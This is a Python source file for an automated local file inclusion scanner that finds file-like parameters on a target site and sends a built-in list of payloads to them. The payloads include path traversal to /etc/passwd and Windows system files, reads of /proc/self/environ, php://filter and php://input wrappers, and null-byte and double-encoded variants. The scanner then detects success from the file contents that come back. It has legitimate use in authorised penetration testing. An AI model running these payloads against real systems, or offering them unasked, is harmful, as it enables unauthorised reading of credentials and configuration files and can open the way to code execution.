import requests
from typing import List, Dict, Optional
from urllib.parse import urljoin, urlparse, parse_qs
import re
import json
import time
from concurrent.futures import ThreadPoolExecutor
import base64

class LFIScanner:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.vulnerabilities = []
        self.params = []
        
        # Common LFI parameters
        self.lfi_params = [
            'file', 'page', 'include', 'path', 'doc', 'folder', 'root',
            'pg', 'style', 'pdf', 'template', 'php_path', 'docroot',
            'site', 'name', 'dir', 'document', 'rootdir', 'select',
            'url', 'data', 'readfile', 'fileread', 'download', 'img',
            'filename', 'filepath', 'input', 'view', 'layout', 'content',
            'display', 'read', 'req', 'dir', 'show', 'navigation', 'open'
        ]
        
        # Common LFI payloads
        self.lfi_payloads = [
            # Basic LFI
            '../../../etc/passwd',
            '..\\..\\..\\windows\\win.ini',
            '....//....//....//etc/passwd',
            '..%2f..%2f..%2fetc/passwd',
            '..%252f..%252f..%252fetc/passwd',
            
            # PHP wrappers
            'php://filter/convert.base64-encode/resource=index.php',
            'php://input',
            'php://filter/read=string.rot13/resource=index.php',
            'php://filter/convert.iconv.utf-8.utf-16le/resource=index.php',
            
            # Null byte injection
            '../../../etc/passwd%00',
            '..\\..\\..\\windows\\win.ini%00',
            
            # Double encoding
            '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd',
            '%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows/win.ini',
            
            # Path traversal variations
            '....//....//....//etc/passwd',
            '..\\..\\..\\windows\\win.ini',
            '....\/....\/....\/etc/passwd',
            '..%5c..%5c..%5cwindows/win.ini',
            
            # Common files to check
            '/etc/passwd',
            '/etc/hosts',
            '/etc/apache2/apache2.conf',
            '/etc/nginx/nginx.conf',
            '/proc/self/environ',
            '/proc/self/cmdline',
            '/proc/self/status',
            '/proc/self/fd/0',
            '/proc/self/fd/1',
            '/proc/self/fd/2',
            'C:\\windows\\win.ini',
            'C:\\windows\\system32\\drivers\\etc\\hosts',
            'C:\\boot.ini',
            'C:\\windows\\php.ini',
            'C:\\windows\\my.ini'
        ]

    def scan_lfi(self) -> Dict[str, List[Dict]]:
        """
        Scan for LFI vulnerabilities
        """
        results = {
            "vulnerabilities": [],
            "params": [],
            "details": []
        }
        
        try:
            # Find LFI parameters
            self._find_lfi_params()
            results["params"] = self.params
            
            # Test each parameter
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = []
                for param in self.params:
                    futures.append(executor.submit(self._test_parameter, param))
                    
                for future in futures:
                    vulns = future.result()
                    if vulns:
                        results["vulnerabilities"].extend(vulns)
                        
            # Add detailed information
            results["details"] = self._get_scan_details(results)
            
        except Exception as e:
            print(f"Error scanning for LFI vulnerabilities: {str(e)}")
            
        return results

    def _find_lfi_params(self) -> None:
        """
        Find potential LFI parameters
        """
        try:
            response = requests.get(self.target_url)
            content = response.text
            
            # Find URL parameters
            parsed = urlparse(self.target_url)
            if parsed.query:
                query_params = parse_qs(parsed.query)
                for param in query_params:
                    if param.lower() in self.lfi_params:
                        self.params.append({
                            "url": self.target_url,
                            "method": "GET",
                            "param": param,
                            "type": "url"
                        })
                        
            # Find form parameters
            form_pattern = r'<form[^>]*>.*?</form>'
            forms = re.finditer(form_pattern, content, re.DOTALL)
            
            for form in forms:
                form_html = form.group()
                form_action = re.search(r'action=[\'"]([^\'"]*)[\'"]', form_html)
                form_method = re.search(r'method=[\'"]([^\'"]*)[\'"]', form_html)
                
                if form_action:
                    action = urljoin(self.target_url, form_action.group(1))
                else:
                    action = self.target_url
                    
                method = form_method.group(1).upper() if form_method else 'GET'
                
                # Find input fields
                inputs = re.finditer(r'<input[^>]*name=[\'"]([^\'"]*)[\'"][^>]*>', form_html)
                for input_field in inputs:
                    param = input_field.group(1)
                    if param.lower() in self.lfi_params:
                        self.params.append({
                            "url": action,
                            "method": method,
                            "param": param,
                            "type": "form"
                        })
                        
        except Exception as e:
            print(f"Error finding LFI parameters: {str(e)}")

    def _test_parameter(self, param: Dict) -> List[Dict]:
        """
        Test a parameter for LFI vulnerabilities
        """
        vulnerabilities = []
        
        try:
            for payload in self.lfi_payloads:
                # Send request
                if param["method"] == "GET":
                    test_url = f"{param['url']}?{param['param']}={payload}"
                    response = requests.get(test_url, timeout=5)
                else:
                    data = {param["param"]: payload}
                    response = requests.post(param["url"], data=data, timeout=5)
                    
                # Check response
                if self._check_lfi_success(response, payload):
                    vulnerabilities.append({
                        "url": param["url"],
                        "parameter": param["param"],
                        "method": param["method"],
                        "payload": payload,
                        "type": "LFI",
                        "details": self._get_vulnerability_details(param, payload, response)
                    })
                    
        except Exception as e:
            print(f"Error testing parameter {param['param']}: {str(e)}")
            
        return vulnerabilities

    def _check_lfi_success(self, response: requests.Response, payload: str) -> bool:
        """
        Check if LFI payload was successful
        """
        try:
            # Check response content
            content = response.text.lower()
            
            # Check for common LFI indicators
            indicators = [
                'root:',  # /etc/passwd
                'win.ini',  # Windows system file
                'apache2.conf',  # Apache config
                'nginx.conf',  # Nginx config
                'php.ini',  # PHP config
                'my.ini',  # MySQL config
                'boot.ini',  # Windows boot file
                '<?php',  # PHP code
                '<?=',  # PHP short tags
                '<? ',  # PHP with space
                '<?\n',  # PHP with newline
                '<?\r',  # PHP with carriage return
                '<?\t',  # PHP with tab
                '<?\r\n',  # PHP with CRLF
                '<?\n\r'  # PHP with LFCR
            ]
            
            for indicator in indicators:
                if indicator in content:
                    return True
                    
            # Check for specific file contents
            if 'root:' in content and '/bin/bash' in content:
                return True
                
            # Check for base64 encoded content
            if 'php://filter' in payload:
                try:
                    decoded = base64.b64decode(content)
                    if b'<?php' in decoded or b'<?=' in decoded:
                        return True
                except:
                    pass
                    
            # Check for PHP wrapper content
            if 'php://' in payload:
                if '<?php' in content or '<?=' in content:
                    return True
                    
        except:
            pass
            
        return False

    def _get_vulnerability_details(self, param: Dict, payload: str, response: requests.Response) -> Dict:
        """
        Get detailed information about the vulnerability
        """
        risk_level = "High"
        description = "Local File Inclusion vulnerability detected"
        remediation = "Implement proper file path validation and filtering"
        impact = "Can lead to unauthorized access to sensitive files and remote code execution"
        
        # Check specific vulnerability type
        if 'php://' in payload:
            description = "PHP wrapper LFI detected"
            remediation = "Disable PHP wrappers and implement strict file path validation"
        elif '..' in payload:
            description = "Path traversal LFI detected"
            remediation = "Implement proper path traversal protection and file path validation"
        elif '%00' in payload:
            description = "Null byte injection LFI detected"
            remediation = "Implement proper null byte filtering and file path validation"
            
        return {
            "risk_level": risk_level,
            "description": description,
            "remediation": remediation,
            "impact": impact,
            "response_length": len(response.text),
            "response_time": response.elapsed.total_seconds()
        }

    def _get_scan_details(self, results: Dict) -> List[Dict]:
        """
        Generate detailed scan information
        """
        details = []
        
        try:
            # Add summary information
            details.append({
                "total_vulnerabilities": len(results["vulnerabilities"]),
                "total_params": len(results["params"]),
                "scan_time": time.strftime("%Y-%m-%d %H:%M:%S")
            })
            
            # Add vulnerability statistics
            vuln_stats = {
                "GET": len([v for v in results["vulnerabilities"] if v["method"] == "GET"]),
                "POST": len([v for v in results["vulnerabilities"] if v["method"] == "POST"])
            }
            
            details.append({
                "vulnerability_statistics": vuln_stats
            })
            
            # Add risk assessment
            risk_levels = {
                "High": len([v for v in results["vulnerabilities"] if v["details"]["risk_level"] == "High"]),
                "Medium": len([v for v in results["vulnerabilities"] if v["details"]["risk_level"] == "Medium"]),
                "Low": len([v for v in results["vulnerabilities"] if v["details"]["risk_level"] == "Low"])
            }
            
            details.append({
                "risk_assessment": risk_levels
            })
            
        except Exception as e:
            print(f"Error generating scan details: {str(e)}")
            
        return details 